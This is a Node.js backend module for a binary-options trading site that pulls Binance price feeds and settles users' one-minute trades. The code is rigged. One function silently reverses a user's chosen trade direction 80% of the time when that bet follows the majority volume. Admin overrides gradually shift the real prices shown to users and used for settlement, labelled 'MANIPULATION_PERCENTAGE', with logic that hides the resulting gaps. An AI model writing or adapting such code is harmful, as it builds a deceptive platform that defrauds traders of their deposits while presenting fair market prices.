const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const WebSocket = require('ws'); 
const AdminCopyTrade = require('./models/AdminCopyTrade');

// Global reference for marketData
let globalMarketData = {};

// --- Copy Trade Execution Logic ---
async function executeCopyTrade(io, User, Trade, copyTradeId) {
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
        const copyTrade = await AdminCopyTrade.findById(copyTradeId)
            .populate('userCopies.userId')
            .session(session);

        if (!copyTrade || copyTrade.status !== 'active') {
            await session.abortTransaction();
            session.endSession();
            return;
        }

        copyTrade.status = 'executed';
        await copyTrade.save({ session });

        await session.commitTransaction();
        session.endSession();

    } catch (error) {
        await session.abortTransaction();
        session.endSession();
    }
}

// --- Auto-cleanup expired copy trades ---
async function cleanupExpiredCopyTrades(io, User, Trade) {
    try {
        const now = new Date();
        const expiredTrades = await AdminCopyTrade.find({
            status: 'active',
            executionTime: { $lte: now }
        }).lean();

        for (const copyTrade of expiredTrades) {
            try {
                await executeCopyTrade(io, User, Trade, copyTrade._id);
            } catch (innerErr) {}
        }
    } catch (error) {}
}

async function getTradeDirectionBasedOnVolume(asset, userRequestedDirection) {
    try {
        const currentVolume = await Trade.aggregate([
            { 
                $match: { 
                    asset: asset,
                    status: { $in: ["active", "pending", "scheduled"] } 
                } 
            },
            { 
                $group: { 
                    _id: '$direction',
                    totalVolume: { $sum: '$amount' }
                }
            }
        ]);

        let upVolume = 0;
        let downVolume = 0;

        currentVolume.forEach(item => {
            if (item._id === 'UP') upVolume = item.totalVolume;
            if (item._id === 'DOWN') downVolume = item.totalVolume;
        });

        const totalVolume = upVolume + downVolume;

        if (totalVolume === 0 || upVolume === downVolume) {
            return userRequestedDirection;
        }

        const dominantDirection = upVolume > downVolume ? 'UP' : 'DOWN';

        if (userRequestedDirection === dominantDirection) {
            const random = Math.random(); 
            if (random < 0.8) { 
                return dominantDirection === 'UP' ? 'DOWN' : 'UP';
            }
        }

        return userRequestedDirection;

    } catch (error) {
        return userRequestedDirection;
    }
}

// --- NEW: WEBSOCKET TRADE MONITORING LOGIC ---
function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
    const lastProcessedCompletedCandleTs = {};
    const lastProcessedActivationTs = {};
    let lastCopyTradeCleanup = Date.now();

    // Variables for Smooth Gradual Movement
    const currentOffsets = {}; 
    const lastAggTimes = {};

    let indexModule = {};
    try {
        indexModule = require('./index');
    } catch (e) {
        console.warn("Could not load index.js for overrides.");
    }

    const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade`).join('/');
    const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
    
    let ws = new WebSocket(wsUrl);

    ws.on('open', () => {
        console.log('✅ Connected to Binance WebSockets for Live Market Data & Ultra-Fast Ticks');
    });

    ws.on('message', async (message) => {
        try {
            const parsedRaw = JSON.parse(message);
            const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;

            if (!parsed) return;

            let overrides = {};
            try {
                overrides = indexModule.candleOverride || {};
            } catch (e) {}

            const MANIPULATION_PERCENTAGE = 0.0005; // 0.05% manipulation
            const SMOOTHING_TIME_MS = 15000; // Takes 15 seconds to fully apply offset

            // ==========================================
            // 1. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
            // ==========================================
            if (parsed.e === 'aggTrade') {
                const pair = parsed.s;
                let realPrice = parseFloat(parsed.p);
                const binanceTime = parsed.E; 

                // Target logic
                let targetOffset = 0;
                if (overrides[pair] === 'up') targetOffset = realPrice * MANIPULATION_PERCENTAGE;
                else if (overrides[pair] === 'down') targetOffset = -(realPrice * MANIPULATION_PERCENTAGE);

                if (currentOffsets[pair] === undefined) currentOffsets[pair] = 0;

                const timeDiff = binanceTime - (lastAggTimes[pair] || binanceTime);
                lastAggTimes[pair] = binanceTime;

                // Smooth gradual manipulation logic
                const speedPerMs = (realPrice * MANIPULATION_PERCENTAGE) / SMOOTHING_TIME_MS;

                if (currentOffsets[pair] < targetOffset) {
                    currentOffsets[pair] = Math.min(currentOffsets[pair] + (speedPerMs * timeDiff), targetOffset);
                } else if (currentOffsets[pair] > targetOffset) {
                    currentOffsets[pair] = Math.max(currentOffsets[pair] - (speedPerMs * timeDiff), targetOffset);
                }

                let currentPrice = realPrice + currentOffsets[pair];

                if (!globalMarketData[pair]) {
                    globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
                }

                globalMarketData[pair].currentPrice = currentPrice;

                const now = Date.now();
                if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
                    io.emit('price_update', { pair, price: currentPrice, timestamp: binanceTime });
                    globalMarketData[pair].lastEmit = now;
                }
            }

            // ==========================================
            // 2. CANDLESTICK DATA & SETTLEMENT (kline)
            // ==========================================
            else if (parsed.e === 'kline') {
                const pair = parsed.s; 
                const k = parsed.k;
                
                const activeOffset = currentOffsets[pair] || 0;

                let openPrice = parseFloat(k.o);
                let closePrice = parseFloat(k.c) + activeOffset;
                let highPrice = parseFloat(k.h) + activeOffset;
                let lowPrice = parseFloat(k.l) + activeOffset;

                // Gap removal logic - Attach new candle to previous close
                if (globalMarketData[pair] && globalMarketData[pair].candles && globalMarketData[pair].candles.length > 0) {
                    const prevCandle = globalMarketData[pair].candles[globalMarketData[pair].candles.length - 1];
                    openPrice = prevCandle.close; 
                } else {
                    openPrice += activeOffset;
                }

                // Wicks adjustment to avoid visual breaks
                highPrice = Math.max(highPrice, openPrice, closePrice);
                lowPrice = Math.min(lowPrice, openPrice, closePrice);

                const candleObj = {
                    timestamp: new Date(k.t),
                    open: openPrice,
                    high: highPrice,
                    low: lowPrice,
                    close: closePrice, 
                    isClosed: k.x
                };

                if (!globalMarketData[pair]) globalMarketData[pair] = { candles: [], currentCandle: null };
                globalMarketData[pair].currentCandle = candleObj;

                const activationTs = candleObj.timestamp.getTime();
                if (!lastProcessedActivationTs[pair] || lastProcessedActivationTs[pair] < activationTs) {
                    await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, openPrice);
                    await activatePendingTradesForPair(io, User, Trade, pair, candleObj.timestamp, openPrice);
                    lastProcessedActivationTs[pair] = activationTs;
                }

                if (k.x) { 
                    if (!globalMarketData[pair].candles) globalMarketData[pair].candles = [];
                    globalMarketData[pair].candles.push(candleObj);
                    
                    if (globalMarketData[pair].candles.length > 50) {
                        globalMarketData[pair].candles.shift();
                    }

                    const lastCompletedTs = candleObj.timestamp.getTime();
                    if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {
                        await settleActiveTradesForPair(io, User, Trade, pair, candleObj);
                        lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
                    }

                    // 🚀 AUTO-RESET LOGIC
                    try {
                        if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
                            indexModule.candleOverride[pair] = null;
                        }
                    } catch(e) {}
                }

                const now = Date.now();
                if ((now - lastCopyTradeCleanup) > 5000) {
                    await cleanupExpiredCopyTrades(io, User, Trade);
                    lastCopyTradeCleanup = now;
                }
            }
        } catch (error) {
            console.error('WebSocket message processing error:', error);
        }
    });

    ws.on('close', () => {
        console.log('⚠️ Binance WebSocket Disconnected. Reconnecting in 3 seconds...');
        setTimeout(() => runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS), 3000);
    });

    ws.on('error', (err) => {
        console.error('Binance WebSocket Error:', err.message);
    });
}

async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
    globalMarketData = marketData;
    io.engine.marketData = marketData;

    io.use((socket, next) => {
        try {
            let token = socket.handshake.auth?.token;
            
            if (!token) {
                const authHeader = socket.handshake.headers.authorization;
                if (authHeader && authHeader.startsWith('Bearer ')) {
                    token = authHeader.substring(7);
                }
            }
            
            if (!token) {
                return next(new Error("Authentication error: No token"));
            }
            
            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) {
                    return next(new Error("Authentication error: Invalid token"));
                }
                socket.decoded = decoded;
                next();
            });
        } catch (err) {
            return next(new Error("Authentication error"));
        }
    });

    // START THE NEW WEBSOCKET MONITORING ENGINE
    runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS);

    io.on("connection", async (socket) => {
        try {
            const userId = socket.decoded.id;
            const user = await User.findById(userId);
            if (!user) return socket.disconnect();
            socket.join(user._id.toString());

            const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
            
            socket.emit("init", { 
                balance: user.balance, 
                tradeHistory: userTrades,
                marketData: globalMarketData
            });

            // --- Instant Trade ---
            socket.on("trade", async (data) => {
                try {
                    const { asset, direction, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    });

                    if (existingTrade) {
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete.` 
                        });
                    }

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
                        return socket.emit("error", { message: "Invalid trade amount." });
                    }

                    const freshUser = await User.findById(user._id);

                    if (freshUser.balance < tradeAmount) {
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const finalDirection = await getTradeDirectionBasedOnVolume(asset, direction);

                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: finalDirection, 
                        asset,
                        status: "pending", 
                        timestamp: new Date()
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_pending", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not place trade." });
                }
            });

            // --- Copy Trade ---
            socket.on("copy_trade", async (data) => {
                const session = await mongoose.startSession();
                session.startTransaction();

                try {
                    const { copyTradeId } = data;

                    const freshUser = await User.findById(userId).session(session);
                    if (!freshUser || freshUser.balance < 100) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "Minimum $100 balance required to copy trades" });
                    }

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    }).session(session);

                    if (existingTrade) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete before copying.` 
                        });
                    }

                    const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
                    if (!copyTrade || copyTrade.status !== 'active' || copyTrade.executionTime <= new Date()) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "This copy trade is no longer available" });
                    }

                    const alreadyCopied = copyTrade.userCopies.find(
                        copy => copy.userId.toString() === userId
                    );

                    if (alreadyCopied) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "You have already copied this trade" });
                    }

                    const tradeAmount = (freshUser.balance * copyTrade.percentage) / 100;

                    if (freshUser.balance < tradeAmount) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const executionTime = new Date(copyTrade.executionTime);
                    executionTime.setSeconds(0, 0); 

                    const scheduledTrade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: copyTrade.direction === 'CALL' ? 'UP' : 'DOWN',
                        asset: copyTrade.tradingPair,
                        status: "scheduled",
                        scheduledTime: executionTime, 
                        timestamp: new Date(),
                        isCopyTrade: true,
                        originalCopyTradeId: copyTrade._id
                    });

                    freshUser.balance -= tradeAmount;

                    copyTrade.userCopies.push({
                        userId: userId,
                        copiedAt: new Date(),
                        tradeAmount: tradeAmount
                    });

                    await scheduledTrade.save({ session });
                    await copyTrade.save({ session });
                    await freshUser.save({ session });

                    await session.commitTransaction();
                    session.endSession();

                    const now = new Date();
                    const timeUntilExecution = executionTime - now;
                    const minutesUntilExecution = Math.floor(timeUntilExecution / (1000 * 60));

                    socket.emit("copy_trade_success", {
                        message: `Successfully copied trade! $${tradeAmount.toFixed(2)} scheduled to execute in ${minutesUntilExecution} minutes.`,
                        copyTrade: {
                            tradingPair: copyTrade.tradingPair,
                            direction: copyTrade.direction,
                            percentage: copyTrade.percentage,
                            executionTime: executionTime,
                            tradeAmount: tradeAmount,
                            minutesUntilExecution: minutesUntilExecution
                        },
                        scheduledTrade: scheduledTrade
                    });

                    io.to(user._id.toString()).emit("trade_scheduled", { 
                        trade: scheduledTrade, 
                        balance: freshUser.balance 
                    });

                } catch (error) {
                    await session.abortTransaction();
                    session.endSession();
                    socket.emit("error", { message: "Failed to copy trade" });
                }
            });

            socket.on("cancel_trade", async (data) => {
                try {
                    const trade = await Trade.findOne({
                        _id: data.tradeId,
                        userId: user._id,
                        status: { $in: ["pending", "scheduled"] }
                    });
                    if (!trade) return socket.emit("error", { message: "Trade not found or cannot be cancelled." });

                    const freshUser = await User.findById(user._id);
                    freshUser.balance += trade.amount;
                    await freshUser.save();

                    trade.status = "cancelled";
                    await trade.save();
                    io.to(user._id.toString()).emit("trade_cancelled", { tradeId: trade._id, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not cancel trade." });
                }
            });

            socket.on("disconnect", () => { });
        } catch (err) {
            socket.disconnect();
        }
    });
}

// --- Helper Functions ---
async function activateScheduledTradesForPair(io, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const candleTime = new Date(candleTimestamp);
        candleTime.setSeconds(0, 0);

        const scheduleds = await Trade.find({ 
            status: "scheduled", 
            asset: pair, 
            scheduledTime: { $lte: candleTime } 
        });

        for (const t of scheduleds) {
            t.status = "active";
            t.entryPrice = entryPrice;
            t.activationTimestamp = candleTime; 
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

async function activatePendingTradesForPair(io, User, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const pendings = await Trade.find({ status: "pending", asset: pair });
        for (const t of pendings) {
            t.status = "active";
            t.entryPrice = entryPrice;
            t.activationTimestamp = candleTimestamp; 
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

async function settleActiveTradesForPair(io, User, Trade, pair, lastCompletedCandle) {
    const exitPrice = lastCompletedCandle.close;
    const completedCandleStartTime = new Date(lastCompletedCandle.timestamp).getTime(); 
    const settlementEligibilityTime = completedCandleStartTime + (60 * 1000); 

    try {
        const actives = await Trade.find({ status: "active", asset: pair });
        for (const t of actives) {
            const tradeActivationTime = new Date(t.activationTimestamp).getTime();
            const tradeShouldCloseBy = tradeActivationTime + (60 * 1000); 

            if (tradeShouldCloseBy <= settlementEligibilityTime) { 
                const win = (t.direction === "UP" && exitPrice > t.entryPrice) || (t.direction === "DOWN" && exitPrice < t.entryPrice);
                const tie = exitPrice === t.entryPrice;
                const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount); 

                t.status = "closed";
                t.exitPrice = exitPrice;
                t.result = tie ? "TIE" : (win ? "WIN" : "LOSS");
                t.pnl = pnl;
                t.closeTime = new Date(); 
                await t.save();

                const userAfter = await User.findByIdAndUpdate(
                    t.userId,
                    {
                        $inc: {
                            balance: t.amount + pnl, 
                            totalTradeVolume: t.amount
                        }
                    },
                    { new: true }
                );

                const today = new Date();
                today.setHours(0, 0, 0, 0);
                const tomorrow = new Date(today);
                tomorrow.setDate(tomorrow.getDate() + 1);

                const todayTrades = await Trade.find({
                    userId: t.userId,
                    status: "closed",
                    closeTime: { $gte: today, $lt: tomorrow }
                });

                const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);

                io.to(t.userId.toString()).emit("trade_result", { 
                    trade: t, 
                    balance: userAfter.balance,
                    todayPnl: parseFloat(todayPnl.toFixed(2))
                });
            }
        }
    } catch (err) {}
}

module.exports = { initialize };
